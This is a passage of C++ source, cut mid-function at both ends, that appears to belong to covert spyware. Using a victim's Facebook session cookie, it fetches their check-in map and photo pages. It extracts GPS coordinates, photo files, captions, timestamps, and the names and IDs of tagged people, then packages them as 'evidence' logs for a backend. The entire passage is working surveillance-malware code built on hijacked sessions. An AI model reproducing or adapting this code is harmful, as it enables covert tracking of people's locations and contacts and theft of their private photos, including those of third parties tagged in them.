	// search for user id
	*strUserId = FacebookGetUserId(strRecvBuffer);
	if (!*strUserId || !strcmp(*strUserId, "0"))
	{
		zfree(strRecvBuffer);
		return FALSE;
	}

	// search for screen name
	strParser = *strUserId + strlen(*strUserId) + 1;
	*strScreenName = FacebookGetScreenName(strParser, *strUserId);

	// we're done with this request, copy buffers and frees it
	*strUserId = _strdup(*strUserId);
	*strScreenName = _strdup(*strScreenName);

	zfree(strRecvBuffer);
	return TRUE;
}

/*
	Description:	given a json object containing Facebook places, extracts and packs data into additionalheader and body
	Parameters:		json object, pointer to additionalheader, body that will contain the payload, pointer to size of body, Facebook user id
	Usage:			return true there're data to log, false otherwise. Body is allocated and must be freed by the caller
*/
BOOL FacebookPlacesExtractPosition(__in JSONValue *jValue, __out location_additionalheader_struct *additionalheader, __out BYTE **body, __out DWORD *blen, __in LPSTR strUserId )
{
		
	*body = NULL;
	*blen = 0;
	additionalheader->version = LOCATION_HEADER_VERSION;
	additionalheader->type    = TYPE_LOCATION_GPS;
	additionalheader->number_of_items = 0;

	/* get last place timestamp */
	DWORD dwHighestBatchTimestamp = 0;
	CHAR strUsernameForPlaces[512];
	_snprintf_s(strUsernameForPlaces, sizeof(strUsernameForPlaces), _TRUNCATE, "%s-facebookplaces", strUserId);
	DWORD dwLastTimestampLow, dwLastTimestampHigh;
	
	dwLastTimestampLow = GetLastFBTstamp(strUsernameForPlaces, &dwLastTimestampHigh);
	if (dwLastTimestampLow == FB_INVALID_TSTAMP)
		return FALSE;

	/* get the number of locations */
	JSONObject jRoot = jValue->AsObject();
	if (jRoot.find(L"jsmods") != jRoot.end() && jRoot[L"jsmods"]->IsObject())
	{
		JSONObject jJsmods = jRoot[L"jsmods"]->AsObject();

		if (jJsmods.find(L"require") != jJsmods.end() && jJsmods[L"require"]->IsArray())
		{
			JSONArray jRequire = jJsmods[L"require"]->AsArray();

			if ( jRequire.size() > 0 && jRequire.at(0)->IsArray())
			{
				JSONArray jTmp = jRequire.at(0)->AsArray();
				if (jTmp.size() > 3 && jTmp.at(3)->IsArray())
				{
					JSONArray jTmp2 = jTmp.at(3)->AsArray();

					if (jTmp2.size() > 1 && jTmp2.at(1)->IsObject())
					{
						JSONObject jObj = jTmp2.at(1)->AsObject();
						

						/* jObj contains:
						"stories":[ array with timestamps ],
						"places":[ array with places ],
						"count":4, // number of different places
						"_instanceid":"u_0_44"
						*/

						if ((jObj[L"places"]->IsArray() && jObj[L"places"]->IsArray()) && (jObj[L"stories"]->IsArray() && jObj[L"stories"]->IsArray()))
						{
							JSONArray jPlaces = jObj[L"places"]->AsArray();
							JSONArray jStories = jObj[L"stories"]->AsArray();

							/*  stories element example: {"timestamp":1418910342, .. ,"placeID":133355006713850, ..  }
								places element example:  {"id":133355006713850, "name":"Isle of Skye, Scotland, UK","latitude":57.41219383264, "longitude":-6.1920373066084,"city":814578, "country":"GB"   } 
							*/

							/* loop through stories, for each story find the corresponding place and set the gps record (suboptimal..) */
							for (DWORD i=0; i<jStories.size(); i++)
							{
								if (!jStories.at(i)->IsObject())
									continue;

								UINT64 current_id;
								time_t time = 0;

								/* extract story id and timestamp */
								JSONObject jStory = jStories.at(i)->AsObject();
								if (jStory.find(L"placeID") != jStory.end() && jStory[L"placeID"]->IsNumber())
								{
									current_id = (UINT64) jStory[L"placeID"]->AsNumber();
								}
								
								if (jStory.find(L"timestamp") != jStory.end() && jStory[L"timestamp"]->IsNumber())
								{
									 time = (time_t) jStory[L"timestamp"]->AsNumber();
								}

								
								/* save the most recent timestamp for this batch */
								if (time > dwHighestBatchTimestamp)
									dwHighestBatchTimestamp = time;
								
								/* if it's recent save it otherwise skip this record */
								if (time <= dwLastTimestampLow)
									continue;

								/* find place id in places: suboptimal version loop through each time */
								for (DWORD j=0; j<jPlaces.size(); j++)
								{
									if (!jPlaces.at(j)->IsObject())
										continue;

									UINT64 tmp_id;

									JSONObject jPlace = jPlaces.at(j)->AsObject();
									if (jPlace.find(L"id") != jPlace.end() && jPlace[L"id"]->IsNumber())
									{
										tmp_id = (UINT64) jPlace[L"id"]->AsNumber();

										if (tmp_id == current_id)
										{
											/* got our guy, fill a gps position record */


											/* update additional header, body size */
											additionalheader->number_of_items += 1;
											DWORD dwBodySize = additionalheader->number_of_items * sizeof(gps_data_struct);
											*body = (LPBYTE) realloc(*body, dwBodySize);
											if (!*body)
												return FALSE;

											*blen = _msize(*body);

											gps_data_struct  *record = (gps_data_struct*)( *body + ( dwBodySize - sizeof(gps_data_struct) ));
											SecureZeroMemory(record, sizeof(gps_data_struct));

											/* fill GPS_POSITION */
											record->gps.dwVersion = 1 ;// dunno
											record->gps.dwSize = sizeof(GPS_POSITION);
											record->gps.dwValidFields = GPS_VALID_UTC_TIME | GPS_VALID_LATITUDE | GPS_VALID_LONGITUDE;
											record->gps.dwFlags = FACEBOOK_CHECK_IN;
											//UnixTimeToSystemTime(time, &record->gps.stUTCTime); ignore by backend
																						

											if (jPlace.find(L"latitude") != jPlace.end() && jPlace[L"latitude"]->IsNumber())
											{
												record->gps.dblLatitude = jPlace[L"latitude"]->AsNumber();
											}
											
											if (jPlace.find(L"longitude") != jPlace.end() && jPlace[L"longitude"]->IsNumber())
											{
												record->gps.dblLongitude = jPlace[L"longitude"]->AsNumber();
											}

											if (jPlace.find(L"name") != jPlace.end() && jPlace[L"name"]->IsString())
											{
												/* name is written over the fields starting with dwSatelliteCount: 62 dwords - 1 dword for null */
												//size_t maxNameSize  = 62 * sizeof(DWORD);
												size_t maxNameSize = sizeof(GPS_POSITION) - FIELD_OFFSET(GPS_POSITION, dwSatelliteCount) - 1;
												LPWSTR name = (LPWSTR) zalloc_s(maxNameSize);
												
												_snwprintf_s(name, maxNameSize/2, _TRUNCATE, L"%s", jPlace[L"name"]->AsString().c_str() );
												
												memcpy_s(&record->gps.dwSatelliteCount, maxNameSize, name, lstrlenW(name) * 2 + 2);
												record->gps.rgdwSatellitesInViewSignalToNoiseRatio[GPS_MAX_SATELLITES-1] = 0;
												
												zfree_s(name);
											}

											/* fill remaining field of gps_data_struct */
											record->uSize = sizeof(gps_data_struct);
											record->uVersion = GPS_VERSION;
											//GetSystemTimeAsFileTime(&record->ft);
											UnixTimeToFileTime(time, &record->ft);
											record->gps.flHorizontalDilutionOfPrecision = 100; // needed for intelligence
											record->dwDelimiter = LOG_DELIMITER;
														
											char out[256];
											_snprintf_s(out, 256, _TRUNCATE, "delimiter: %p", record->dwDelimiter);
											
											break;
										} //if (tmp_id == current_id)
									} //if (jPlace.find(L"id") != jPlace.end() && jPlace[L"id"]->IsNumber())
								} //for (DWORD j=0; j<jPlaces.size(); j++)
							} //for (DWORD i=0; i<jStories.size(); i++)


							/* save the highest timestamp in the batch */
							if (dwHighestBatchTimestamp > dwLastTimestampLow)
								SetLastFBTstamp(strUsernameForPlaces, dwHighestBatchTimestamp, 0);

						} //if ((jObj[L"places"]->IsArray() && jObj[L"places"]->IsArray())
					} //if (jTmp2.size() > 1 && jTmp2.at(1)->IsObject())
				}
			}
		}
	}

	/* 	true if *body is not null, otherwise false */
	return *body != NULL;
}


/* 
	Description:	extracts and logs Facebook checkin locations
	Params:			valid Facebook cookie
	Usage:			-
*/
DWORD HandleFacebookPositions(LPSTR strCookie)
{
	
	/* check whether position is enabled */
	if (!bPM_LocationStarted)
		return SOCIAL_REQUEST_NETWORK_PROBLEM;

	bPM_LocationStarted = FALSE;

	LPSTR strUserId, strScreenName; 
	LPSTR strParser1, strParser2;
	
	if (!FacebookGetUserInfo(strCookie, &strUserId, &strScreenName))
		return SOCIAL_REQUEST_BAD_COOKIE;

	zfree_s(strScreenName);

	LPWSTR strUrl = (LPWSTR) zalloc(2048*sizeof(WCHAR));
	if (!strUrl)
	{
		zfree_s(strUserId);
		return SOCIAL_REQUEST_BAD_COOKIE;
	}
	_snwprintf_s(strUrl, 2048, _TRUNCATE, L"/profile.php?id=%S&sk=map", strUserId);
	
	
	CheckProcessStatus();
	LPSTR strRecvBuffer = NULL;
	DWORD dwBuffSize;
	DWORD dwRet = HttpSocialRequest(L"www.facebook.com", L"GET", strUrl, 443, NULL, 0, (LPBYTE *)&strRecvBuffer, &dwBuffSize, strCookie); 

	zfree_s(strUrl);

	if (dwRet != SOCIAL_REQUEST_SUCCESS)
	{
		zfree(strRecvBuffer);
		zfree(strUserId);
		return SOCIAL_REQUEST_BAD_COOKIE;
	}

	/* find the snippet of json we're interested in and give it to the parser */
	strParser1 = strstr(strRecvBuffer, "{\"display_dependency\":[\"pagelet_timeline_medley_inner_map\"]");
	if (!strParser1)
	{
		/* cleanup */
		zfree_s(strRecvBuffer);
		zfree_s(strUserId);
		return SOCIAL_REQUEST_BAD_COOKIE;
	}

	strParser2 = strstr(strParser1, "})");
	*(strParser2+1) = NULL;

	
	LPSTR strJson = strParser1;

	JSONValue *jValue = JSON::Parse(strJson);
	if (jValue != NULL && jValue->IsObject())
	{
		DWORD dwSize;
		LPBYTE lpBody;
		location_additionalheader_struct additionaheader;

		if ( FacebookPlacesExtractPosition(jValue, &additionaheader, &lpBody, &dwSize, strUserId) )
		{
			CheckProcessStatus();
			HANDLE hLog = Log_CreateFile(PM_WIFILOCATION, (BYTE *)&additionaheader, sizeof(additionaheader));
			if (hLog != INVALID_HANDLE_VALUE)
			{
				
				Log_WriteFile(hLog, (BYTE *)lpBody, dwSize);
				Log_CloseFile(hLog);
			}
			zfree_s(lpBody);
		}
	}

	/* cleanup */
	zfree_s(strRecvBuffer);
	zfree_s(strUserId);
	if (jValue)
		delete jValue;

	return SOCIAL_REQUEST_SUCCESS;
}
/* end of Facebook position functions */

/* Facebook photo functions */
UINT64 SocialGetLastMessageId(__in LPSTR strUser)
{
	DWORD dwHigh = 0;
	DWORD dwLow = GetLastFBTstamp(strUser, &dwHigh);

	return (UINT64) dwHigh << 32 | dwLow;
}

VOID SocialSetLastMessageId(__in LPSTR strUser, __in UINT64 messageId)
{
	DWORD high = (DWORD)( messageId >> 32 );
	DWORD low =  (DWORD)( messageId );

	SetLastFBTstamp(strUser, low, high);
}

/* 
	Description:	extracts the photo blob from a Facebook photo specific page
	Params:			Facebook cookie, photo specific page, returned size of the blog, returned path (URL) of the blob
	Usage:			returns null or a buffer containing the image that must be freed by the caller, strPhotoBlobPath must be freed by the caller if not null. 
					Input page is modified temporary.
*/
LPBYTE FacebookPhotoExtractPhotoBlob(__in LPSTR strCookie, __in LPSTR strHtmlPage, __out PULONG uSize, __out LPSTR *strPhotoBlobPath)
{
	/* 
		allocations: 
		- strUrl is allocated and free'd accordingly
		- strRecvPhoto is allocated and returned to the caller if not NULL
		- strPhotoBlobPath is allocated and returned to the caller if not NULL
	*/
	
	LPSTR strParser1, strParser2;
	CHAR chTmp;

	/*	photo url follows id="fbPhotoImage": 
			<img class="fbPhotoImage img" id="fbPhotoImage" src="https://scontent-b.xx.fbcdn.net/hphotos-xpf1/v/t1.0-9/10409298_1588556341373553_8673446508125364435_n.jpg?oh=122bdc630c330a300e034afee9ead8a0&amp;oe=55290EDD" alt="">  
	*/ 
	strParser1 = strstr(strHtmlPage, FBID_PHOTO_URL);
	if (!strParser1)
		return NULL;

	strParser1 += strlen(FBID_PHOTO_URL);

	strParser2 = strstr(strParser1, "\"");
	if (!strParser2)
		return NULL;

	/* temporary change input page */
	chTmp = *strParser2;
	*strParser2 = NULL;

	
	/* poor man html unescape, replace the ampersand in the url: &amp; -> & */
	std::string tmp(strParser1);
	replaceAll(tmp, "&amp;", "&");
	LPCSTR szUnescapedUrl = tmp.c_str();

	LPWSTR strUrl = (LPWSTR) zalloc_s(URL_SIZE_IN_CHARS  * sizeof(WCHAR));
	if (!strUrl)
		return NULL;

	/* save the complete url, break it down for request next */
	_snwprintf_s(strUrl, URL_SIZE_IN_CHARS, _TRUNCATE, L"%S", szUnescapedUrl );

	/* restore input page */
	*strParser2 = chTmp;

	/* copy url into the out parameter*/
	*strPhotoBlobPath = (LPSTR) zalloc_s(strlen(szUnescapedUrl) + 1);
	if (*strPhotoBlobPath)
		strncpy_s(*strPhotoBlobPath, strlen(szUnescapedUrl) + 1, szUnescapedUrl, _TRUNCATE);
	
	/*	strUrl is "scontent-b.xx.fbcdn.net/hphotos-xpf...."
		null-out the first '/' and obtain domain-NULL-relative 
		strUrl will hold the domain
		strUrlRelative will hold the relative part, WinHTTP can handle the missing '/'
	*/
	LPWSTR strUrlRelative = StrStrW(strUrl, L".net");
	if (!strUrlRelative)
	{
		zfree_s(strUrl);
		return NULL;
	}

	strUrlRelative += wcslen(L".net");
	*strUrlRelative = NULL;
	strUrlRelative +=1;


	LPBYTE strRecvPhoto = NULL;
	DWORD dwBuffSize = 0;
	CheckProcessStatus();
	DWORD dwRet = HttpSocialRequest(strUrl, L"GET", strUrlRelative, 443, NULL, 0, &strRecvPhoto, &dwBuffSize, strCookie);
	*uSize = dwBuffSize;
	zfree_s(strUrl);
	
	if (strRecvPhoto)
		return strRecvPhoto;
	else
		return NULL;
}


/*
	Description:	extracts the caption from a Facebook photo specific page
	Params:			Facebook photo specific page
	Usage:			returns null or a string containing the caption, which must be freed by the caller. Input page is modified temporary.
*/
LPSTR FacebookPhotoExtractPhotoCaption(LPSTR strHtmlPage)
{
	/*
		allocations:
			- strCaption is allocated and returned to the caller if not NULL

	*/

	LPSTR strParser1, strParser2;
	CHAR chTmp;
	LPSTR strCaption = NULL;

	/*  caption, if any, follows span class="hasCaption": 
			<span class="hasCaption"> <br>very serious</span> 
	*/ 

	strParser1 = strstr(strHtmlPage, FBID_PHOTO_CAPTION);
	if (strParser1)
	{
		strParser1 += strlen(FBID_PHOTO_CAPTION);
		strParser1 = strstr(strParser1, ">"); // skip <br>
		
		if (!strParser1)
			return NULL;

		strParser1 +=1;

		strParser2 = strstr(strParser1, "</");

		if (strParser2)
		{

			/* temporary change input page */
			chTmp = *strParser2;
			*strParser2 = NULL;


			size_t length = strlen(strParser1) + 1;
			strCaption = (LPSTR) zalloc_s(length);
		
			if (!strCaption)
				return NULL;

			std::string tmp(strParser1);
			replaceAll(tmp, "\"", "\\\"");
			LPCSTR szUnescapedUrl = tmp.c_str();

			strncpy_s(strCaption, length, szUnescapedUrl, _TRUNCATE);
			

			/* restore input page */
			*strParser2 = chTmp;
		}

	}

	return strCaption;
}

/*
	Description:	extracts tags from a Facebook photo specific page
	Params:			Facebook photo specific page
	Usage:			returns null or a buffer containing a list of tags, which must be freed by the caller. Input page is modified temporary.
					
					Array of tags has the format 'name, facebook_id;..', when facebook_id is not available it's set to null:
					- johnny,12341234;begoode,null;unknown,null 	

					Assumptions:
					- Facebook names/handles can't contain ',' or ';'
*/
LPSTR FacebookPhotoExtractPhotoTags(LPSTR strHtmlPage)
{
	/*
		allocations:
			- strTags is reallocated within a loop and returned to the caller if not NULL
	*/

	LPSTR strParser1, strParser2, strParserInner1, strParserInner2;
	CHAR chTmp, chTmpInner;
	LPSTR strTags = NULL;

	/*  other people tag:

			everything will be within <span class="fbPhotoTagList" id="fbPhotoPageTagList">..</span>:
	
			- not registered in Facebook
				<span class="fbPhotoTagListTag tagItem"><input type="hidden" autocomplete="off" name="tag[]" value="1588556671373520"><a class="textTagHovercardLink taggee" data-tag="1588556671373520" data-hovercard="/ajax/hovercard/hovercard.php?id=1588556671373520&amp;type=mediatag&amp;media_info=0.1588556341373553" aria-owns="js_e" aria-haspopup="true" id="js_f">Bloody Abu Dhabi</a></span>
			
			- registered in Facebook
				<span class="fbPhotoTagListTag tagItem"><input type="hidden" autocomplete="off" name="tag[]" value="100003663718866"><a class="taggee" href="https://www.facebook.com/antroide.succhienmberg" data-tag="100003663718866" data-hovercard="/ajax/hovercard/hovercard.php?id=100003663718866&amp;type=mediatag&amp;media_info=0.1588556338040220" aria-owns="js_9" aria-haspopup="true" id="js_a">Antroide Succhienmberg</a></span>
	*/
	strParser1 = strstr(strHtmlPage, FBID_PHOTO_TAG_LIST);
	if (strParser1)
	{
		/* loop through the tag list */
		while (TRUE)
		{
			strParser1 = strstr(strParser1, FBID_PHOTO_TAG_ITEM);
			
			if (!strParser1) // if we can't find a tag item, bail 
				break;

			strParser1 += strlen(FBID_PHOTO_TAG_ITEM);

			strParser2 = strstr(strParser1, "</span>");

			if (!strParser2) 
				break;

			/* temporary change input page */
			chTmp = *strParser2;
			*strParser2 = NULL;

			/* advance strParser1 skipping <input ...>, can skip the return value check */
			strParser1 = strstr(strParser1, ">") + 1;  
			



			/* a] fetch taggee facebook id if available, 'null' otherwise */
			CHAR strFacebookId[256] = {'n', 'u', 'l', 'l', 0};

			if (strstr(strParser1, "class=\"taggee\""))
			{		/* registered user fetch the id */
					 strParserInner1 = strstr(strParser1, "data-tag=\"");
					 strParserInner1 += strlen("data-tag=\"");

					 if (strParserInner1)
					 {
						 strParserInner2 = strstr(strParserInner1, "\"");

						 /* temporary change input page */
						 chTmpInner = *strParserInner2;
						 *strParserInner2 = NULL;

						 strncpy_s(strFacebookId, 256, strParserInner1, _TRUNCATE);
						 

						 /* restore input page */
						 *strParserInner2 = chTmpInner;
					 }
			
			}

			/* b] fetch taggee name */
			CHAR strTaggeeName[512] = {'u', 'n', 'k', 'n', 'o', 'w', 'n', 0}; 

			strParserInner1 = strstr(strParser1, ">");
			if (strParserInner1)
			{
				strParserInner1 +=1;

				strParserInner2 = strstr(strParserInner1, "<");

				/* temporary change input page */
				 chTmpInner = *strParserInner2;
				 *strParserInner2 = NULL;

				 strncpy_s(strTaggeeName, 512, strParserInner1, _TRUNCATE);

				 /* restore input page */
				 *strParserInner2 = chTmpInner;

			}


			/* restore input page */
			*strParser2 = chTmp;

			/* prepare for next loop */
			strParser1 = strParser2;


			/* save new record */
			size_t tags_size = 0, old_tags_size = 0;
			
			// determine new buffer size and increase allocated space accordingly
			if (strTags)
				old_tags_size += strlen(strTags);

			tags_size = old_tags_size + strlen(strTaggeeName) + strlen(strFacebookId) + 3; // 3 = comma + semicolon + NULL
			strTags = (LPSTR) realloc(strTags, tags_size); 

			// if allocation failed return either what has been allocated so far or NULL
			if (!strTags)
				return strTags;

			// initialize to 0 before first record strcat_s
			if (!old_tags_size)
				SecureZeroMemory(strTags, tags_size);

			// append strings
			strcat_s(strTags, tags_size, strTaggeeName);
			strcat_s(strTags, tags_size, ",");
			strcat_s(strTags, tags_size, strFacebookId);
			strcat_s(strTags, tags_size, ";");


		}
	}

	return strTags;
}

/*
	Description:	extracts the location from a Facebook photo specific page
	Params:			Facebook cookie, Facebook photo specific page
	Usage:			returns null or a string containing the location, which must be freed by the caller. Input page is modified temporary.

					location format is latitude,longitude:
					45.0,-9.1
*/
LPSTR FacebookPhotoExtractPhotoLocation(__in LPSTR strCookie, __in LPSTR strHtmlPage, facebook_placeId_to_location *idToLocation_hash_head)
{

		/*	
		allocations:
			- a page is fetched and free'd
			- strLocation is allocated and returned to the caller if not NULL
	*/

	LPSTR strParser1, strParser2;
	CHAR chTmp;
	LPSTR strLocation = NULL;

	/*	location:
			a]	find
				<span class="fbPhotoTagListTag withTagItem tagItem"><input type="hidden" autocomplete="off" name="tag[]" value="231160113588411"><a class="taggee" href="https://www.facebook.com/pages/Nurburgring-Nordschleife/231160113588411?ref=stream" data-hovercard="/ajax/hovercard/page.php?id=231160113588411" aria-owns="js_9" aria-haspopup="true" id="js_a">Nurburgring Nordschleife</a></span>
			
			b]	value s.a. 231160113588411 is the placeId and key idToLocation_hash_head
	*/

	strParser1 = strstr(strHtmlPage, FBID_PHOTO_LOCATION);
	if (strParser1)
	{
		/* a] */
		strParser1 += strlen(FBID_PHOTO_LOCATION);
		strParser1 = strstr(strParser1, "value=\"");
		if (!strParser1)
			return NULL;
		
		strParser1 += strlen("value=\"");
		
		strParser2 = strstr(strParser1, "\"");
		if (!strParser2)
			return NULL;
		
		
		/* temporary change input page */
		chTmp = *strParser2;
		*strParser2 = NULL;

		
		UINT64 thisPlaceId = _strtoui64(strParser1, NULL, 10);
		if (!thisPlaceId)
			return NULL;

		facebook_placeId_to_location *findMe = NULL;
		HASH_FIND(hh, idToLocation_hash_head, &thisPlaceId, sizeof(UINT64), findMe);

		if (findMe == NULL)
			return NULL;

		/* prepare full string */
		strLocation = (LPSTR) zalloc_s(64); 
		if (strLocation)
			_snprintf_s(strLocation, 64, _TRUNCATE, "%f,%f", findMe->latitude, findMe->longitude );



		/* restore input page */
		*strParser2 = chTmp;

	}

	return strLocation;
}


/*
	Description:	extracts the epoch timestamp  from a Facebook photo specific page
	Params:			Facebook photo specific page
	Usage:			returns null or a string containing the epoch timestamp, which must be freed by the caller. Input page is modified temporary.
					
*/
LPSTR FacebookPhotoExtractTimestamp(__in LPSTR strHtmlPage)
{
	/* allocations:
		- strTimestamp is allocated and returned to the caller
	*/

	LPSTR strParser1, strParser2;
	CHAR chTmp;
	LPSTR strTimestamp = NULL;

	strParser1 = strstr(strHtmlPage, FBID_PHOTO_TIMESTAMP);
	if (!strParser1)
		return NULL;
	
	strParser1 += strlen(FBID_PHOTO_TIMESTAMP);
	strParser1 = strstr(strParser1, "data-utime=\"");
	if (!strParser1)
		return NULL;

	strParser1 += strlen("data-utime=\"");

	strParser2 = strstr(strParser1, "\"");
	if (!strParser2)
		return NULL;

	/* temporary change input page */
	chTmp = *strParser2;
	*strParser2 = NULL;

	size_t timestampLength = strlen(strParser1) + 1;
	strTimestamp = (LPSTR) zalloc_s(timestampLength);
	if (!strTimestamp)
		return NULL;

	strncpy_s(strTimestamp, timestampLength, strParser1, _TRUNCATE);

	/* restore input page */
	*strParser2 = chTmp;

	return strTimestamp;
}


/*
	Description:	append to strAppendMe a snprintf' of strFormat and strConsumed
	Params:			string to be appended, format string with a %s (e.g. \"description\": \"%s\", ";), string sprintf'd into the format string
	Usage:			changes strAppendMe, by reallocating  and appending.

*/
VOID FacebookPhotoLogJsonAppend(LPSTR* strAppendMe, __in LPCSTR strFormat, __in LPSTR strConsumed)
{
	/*	allocations:
		- strTemp is allocated and free'd
		- strAppendMe is reallocated		
	*/

	if (!*strAppendMe  || !strFormat || !strConsumed)
		return;

	size_t strJsonLogSize = 0;
	LPSTR strTemp = NULL;
	size_t tempSize = strlen(strConsumed) + strlen(strFormat) -2 + 1; // -2: %s , +1: null
	strTemp = (LPSTR) zalloc_s(tempSize);
	if (strTemp)
	{
		_snprintf_s(strTemp, tempSize, _TRUNCATE, strFormat, strConsumed);

		strJsonLogSize = strlen(strTemp) + strlen(*strAppendMe) + 1;
		*strAppendMe = (LPSTR) realloc(*strAppendMe, strJsonLogSize);

		if (*strAppendMe)
			strncat_s(*strAppendMe, strJsonLogSize, strTemp, _TRUNCATE);

		zfree_s(strTemp);
	}
		
}


/* 
	Description:	prepare and queue a complete photo log (blob + metadata) for a single fbid
	Params:			photo blob, its size, caption, tags, location, path 
	Usage:			-
					
*/
VOID FacebookPhotoLog(__in LPBYTE lpPhotoBlob, __in ULONG uSize, __in LPSTR strCaption, __in LPSTR strTags, __in LPSTR strLocation, __in LPSTR strPhotoPath, __in LPSTR strTimestamp)
{
	/* allocations:
		- strJsonLog contain the full json log and before queuing the evidence the null termination is removed, beware
	*/
	LPSTR strJsonLog = NULL;
	size_t strJsonLogSize = 0;

	// program
	LPCSTR strProgramJson = "{ \"program\": \"Facebook\", \"device\": \"Desktop\", ";
	size_t programSize = strlen(strProgramJson) + 1;
	strJsonLog = (LPSTR) zalloc_s(programSize);
	if (strJsonLog)
		strncpy_s(strJsonLog, programSize, strProgramJson, _TRUNCATE);
		
	// path
	if (strPhotoPath)
	{
		LPCSTR strCaptionTemplate = "\"path\": \"%s\", ";
		FacebookPhotoLogJsonAppend(&strJsonLog, strCaptionTemplate, strPhotoPath);
	}

	// caption
	if (strCaption)
	{
		LPCSTR strCaptionTemplate = "\"description\": \"%s\", ";
		FacebookPhotoLogJsonAppend(&strJsonLog, strCaptionTemplate, strCaption);
	}

	// tags
	if (strTags)
	{
		// "convert johnny,12341234;begoode,null;" to [{"name":"johnny", "handle":"12341234"},{"name":"begoode"}]
		LPSTR strContext = NULL;
		LPSTR strRecord = strtok_s(strTags, ";", &strContext);
		size_t strTagJsonSize = 0;

		LPSTR strTagJson = (LPSTR) zalloc_s(4);

		if (strTagJson)
		{
			_snprintf_s(strTagJson, 4, _TRUNCATE, "[");

			while (strRecord != NULL)
			{

				LPSTR strHandle = strstr(strRecord, ",");
				if (strHandle) // verify handle is kosher
				{
					*strHandle = NULL;
					strHandle +=1;

					// strRecord points to taggee name, strHandle to its handle, if any
					LPCSTR strTaggeeTemplate = "{\"name\": \"%s\"";
					FacebookPhotoLogJsonAppend(&strTagJson, strTaggeeTemplate, strRecord);

					if ( strcmp(strHandle, "null") )
					{
						// we've a handle
						LPCSTR strHandleTemplate = ", \"handle\": \"%s\", \"type\": \"facebook\"";
						FacebookPhotoLogJsonAppend(&strTagJson, strHandleTemplate, strHandle);
					} 

					// close the record with "},"
					strTagJsonSize = strlen(strTagJson) + 1 + 2; // null + },
					strTagJson = (LPSTR) realloc(strTagJson, strTagJsonSize);
					if (strTagJson)
						strncat_s(strTagJson, strTagJsonSize, "},", _TRUNCATE);
				}
				strRecord = strtok_s(NULL, ";", &strContext);
			}

			// overwrite last "," and close the record with "],"
			LPSTR strComma = strrchr(strTagJson, ',');
			if (strComma)
				*strComma = ' ';

			
			// prepare the final json 
			LPCSTR strTagsTemplate = "\"tags\": %s], ";
			FacebookPhotoLogJsonAppend(&strJsonLog, strTagsTemplate, strTagJson);

			zfree_s(strTagJson);
		}
	}

	// location
	if (strLocation)
	{
		// convert "45.0,-9.1" to {"lat": 45.0, "lon": 9.1, "r": 50}
		LPSTR strLongitude = strstr(strLocation, ",");
		LPSTR strLocationJson = NULL;
		
		if (strLongitude)
		{
			strLocationJson = (LPSTR) zalloc_s(4);
			if (strLocationJson)
			{
				_snprintf_s(strLocationJson, 4, _TRUNCATE, "{");
				
				*strLongitude = NULL;
				strLongitude +=1;

				// strLocation points to lat value, strLongitude points to lon value
				FacebookPhotoLogJsonAppend(&strLocationJson, "\"lat\": %s, ", strLocation);

				FacebookPhotoLogJsonAppend(&strLocationJson, "\"lon\": %s, \"r\": 50}", strLongitude);

				LPCSTR strLocationTemplate = "\"place\": %s, ";
				FacebookPhotoLogJsonAppend(&strJsonLog, strLocationTemplate, strLocationJson);

				zfree_s(strLocationJson);
			}
		}
	}

	// timestamp
	if (strTimestamp)
	{
		LPCSTR strTimestampTemplate = "\"time\": %s, ";
		FacebookPhotoLogJsonAppend(&strJsonLog, strTimestampTemplate, strTimestamp);
	}

	// close json


	strJsonLogSize = strlen(strJsonLog);
	CHAR* strReplace = strrchr(strJsonLog, ',');
	if (strReplace)
	{
		// N.B.: from now on strJsonLog is not NULL terminated anymore
		// length is 3 because we're replacing ", " + NULL, which terminates every partial json string 
		CHAR a[] = { '}', ' ', ' ' };  
		memcpy_s(strReplace, 3, &a, 3);
	}
	
	

	size_t additionalHeaderSize = sizeof(PHOTO_ADDITIONAL_HEADER) + strJsonLogSize;
	LPPHOTO_ADDITIONAL_HEADER lpPhotoAdditionalHeader = (LPPHOTO_ADDITIONAL_HEADER) zalloc_s(additionalHeaderSize);
	if (!lpPhotoAdditionalHeader)
	{
		zfree_s(strJsonLog);
		return;
	}

	lpPhotoAdditionalHeader->uVersion = LOG_PHOTO_VERSION;
	memcpy_s(lpPhotoAdditionalHeader->strJsonLog, strJsonLogSize, strJsonLog, strJsonLogSize);


	DWORD dwEvSize;

	CheckProcessStatus();
	HANDLE hLog = Log_CreateFile(PM_PHOTO, (LPBYTE) lpPhotoAdditionalHeader, additionalHeaderSize);
	
	if (hLog != INVALID_HANDLE_VALUE)
	{
		Log_WriteFile(hLog, (LPBYTE) lpPhotoBlob, _msize(lpPhotoBlob));
		Log_CloseFile(hLog);
	}

	/* cleanup */
	zfree_s(lpPhotoAdditionalHeader);
	zfree_s(strJsonLog);
	
}

/*
	Description:	fetches Facebook photo blob and its metadata and then queues the evidence 
	Params:			valid Facebook cookie, struct for fbid
	Usage:			-
*/
VOID FacebookPhotoHandleSinglePhoto(__in LPSTR strCookie,  facebook_photo_id *fbid, facebook_placeId_to_location *idToLocation_hash_head)
{

	/*	
		a] fetch page:
			url format:
			https://www.facebook.com/photo.php?fbid=1588556338040220 
	*/

	LPWSTR strUrl = (LPWSTR) zalloc_s(URL_SIZE_IN_CHARS  * sizeof(WCHAR));
	if (!strUrl)
		return;

	_snwprintf_s(strUrl, URL_SIZE_IN_CHARS , _TRUNCATE, L"/photo.php?fbid=%I64d",  fbid->fbid);
	
	LPSTR strRecvBuffer = NULL;
	DWORD dwBuffSize;
	CheckProcessStatus();
	DWORD dwRet = HttpSocialRequest(L"www.facebook.com", L"GET", strUrl, 443, NULL, 0, (LPBYTE *)&strRecvBuffer, &dwBuffSize, strCookie);
	zfree_s(strUrl);

	if (dwRet != SOCIAL_REQUEST_SUCCESS)
		return;


	/* strip hidden_elem */
	std::string tmpSanitize(strRecvBuffer);
	replaceAll(tmpSanitize, " hidden_elem", "");
	replaceAll(tmpSanitize, "hidden_elem ", "");
	replaceAll(tmpSanitize, " hidden_elem ", "");
	LPSTR facebookPhotoPageSanitized = _strdup(tmpSanitize.c_str());

	if( facebookPhotoPageSanitized == NULL)
	{
		zfree_s(strRecvBuffer);
		return;
	}
	

	/*	b] mandatory - retrieve the photo blob and its path */ 
	ULONG uSize = 0;
	LPSTR strPhotoBlobPath = NULL;
	LPBYTE strRecvPhoto = FacebookPhotoExtractPhotoBlob(strCookie, facebookPhotoPageSanitized, &uSize, &strPhotoBlobPath);


	/*  c] optional - caption	*/ 
	LPSTR strCaption = FacebookPhotoExtractPhotoCaption(facebookPhotoPageSanitized);


	/*  d] optional - other people tag	*/
